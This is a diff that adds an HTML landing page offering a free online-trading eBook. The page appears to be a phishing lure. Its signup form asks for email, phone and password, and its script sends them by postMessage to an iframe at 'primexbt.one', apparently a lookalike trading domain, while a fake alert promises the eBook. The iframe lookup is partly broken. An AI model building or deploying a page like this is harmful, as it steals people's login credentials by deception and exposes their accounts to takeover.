@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>The Future of Online Trading</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 0;
+        }
+        .header {
+            background-color: #48A6EB;
+            color: #fff;
+            padding: 20px;
+            width: 100%;
+            text-align: center;
+        }
+        .container {
+            max-width: 800px;
+            background: #fff;
+            margin: 20px;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        .container h1 {
+            margin-top: 0;
+        }
+        .container p {
+            line-height: 1.6;
+        }
+        .ebook-cover {
+            text-align: center;
+            margin: 20px 0;
+        }
+        .ebook-cover img {
+            max-width: 100%;
+            border-radius: 8px;
+        }
+        .signup-form {
+            background-color: #f9f9f9;
+            padding: 20px;
+            border-radius: 8px;
+            margin-top: 20px;
+        }
+        .signup-form h2 {
+            margin-top: 0;
+        }
+        .signup-form input[type="text"],
+        .signup-form input[type="email"],
+        .signup-form input[type="password"],
+        .signup-form input[type="tel"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .signup-form button {
+            width: 100%;
+            padding: 10px;
+            background-color: #48A6EB;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .signup-form button:hover {
+            background-color: #357ABD;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>The Future of Online Trading</h1>
+        <p>Discover the latest trends and strategies in online trading. Download your eBook and get a professional guide from our Professional Trading Broker today!</p>
+    </div>
+    <div class="container">
+        <div class="ebook-cover">
+            <img src="image.png" alt="The Future of Online Trading eBook Cover">
+        </div>
+        <p>In this comprehensive eBook, you will learn about the future trends shaping the online trading industry, the latest strategies to maximize your profits, and expert insights from seasoned traders. Whether you are a beginner or an experienced trader, this eBook is a must-read for anyone looking to stay ahead in the rapidly evolving world of online trading.</p>
+        <div class="signup-form">
+            <h2>Get Your eBook and Professional Guide</h2>
+            <form id="signup-form">
+                <label for="email">Email:</label>
+                <input type="email" id="email" name="email" required>
+                <label for="phone">Phone:</label>
+                <input type="tel" id="phone" name="phone" required>
+                <label for="password">Password:</label>
+                <input type="password" id="password" name="password" required>
+                <button type="submit">Submit</button>
+            </form>
+        </div>
+    </div>
+    <script>
+        document.getElementById('signup-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const phone = document.getElementById('phone').value;
+            const password = document.getElementById('password').value;
+            
+            // Construct the payload to send to the iframe
+            const payload = {
+                email: email,
+                phone: phone,
+                password: password
+            };
+            
+            const iframe = document.querySelector('#container iframe');
+            
+            if (iframe) {
+                iframe.contentWindow.postMessage(payload, 'https://primexbt.one');  // Send the payload to the iframe
+                console.log('Payload sent:', payload);
+            } else {
+                console.error('Iframe not found.');
+            }
+
+            alert('Form submitted! Your eBook will be sent to your email.');
+        });
+
+        // Listener to handle messages from iframe
+        window.addEventListener('message', function(event) {
+            if (event.origin !== 'https://primexbt.one') return;  // Validate the origin
+            console.log('Received message from iframe:', event.data);
+        }, false);
+    </script>
+</body>
+</html>
